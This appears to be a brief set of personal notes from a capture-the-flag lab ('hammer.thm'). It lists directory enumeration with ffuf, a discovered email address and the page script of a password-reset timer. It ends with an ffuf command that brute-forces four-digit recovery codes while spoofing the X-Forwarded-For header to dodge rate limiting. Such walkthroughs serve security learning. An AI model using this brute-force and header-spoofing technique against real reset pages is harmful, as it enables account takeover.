Typical Enumeration stuff
```
nmap/rustscan
gobuster
```

```bash
#Better Directory finding
#Page source gives hint that directories must conform to /hmr_*
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.3.28:1337/hmr_FUZZ -s

logs
```

We find a file called error.logs here
```bash

#Find an email address in the location

tester@hammer.thm

#Looking at the source of the password reset page we see that there is a timer/reset setting once we find a valid email to use. Probably need to keep reseting the timer here
```
*Code block of interest*
```javascript

    <script>
	let countdownv = ;
        function startCountdown() {
            
            let timerElement = document.getElementById("countdown");
			const hiddenField = document.getElementById("s");
            let interval = setInterval(function() {
                countdownv--;
				 hiddenField.value = countdownv;
                if (countdownv <= 0) {
                    clearInterval(interval);
					//alert("hello");
                   window.location.href = 'logout.php'; 
                }
                timerElement.textContent = "You have " + countdownv + " seconds to enter your code.";
            }, 1000);
        }
    </script>
```


`ffuf -w four_digit_numbers.txt -u “http://10.10.3.28:1337/reset_password.php” -X “POST” -d “recovery_code=FUZZ&s=60” -H “Cookie: PHPSESSID=qv3klj8h89g9tpvtq5i1lsoj7o” -H “X-Forwarded-For: FUZZ” -H “Content-Type: application/x-www-form-urlencoded” -fr “Invalid” -s`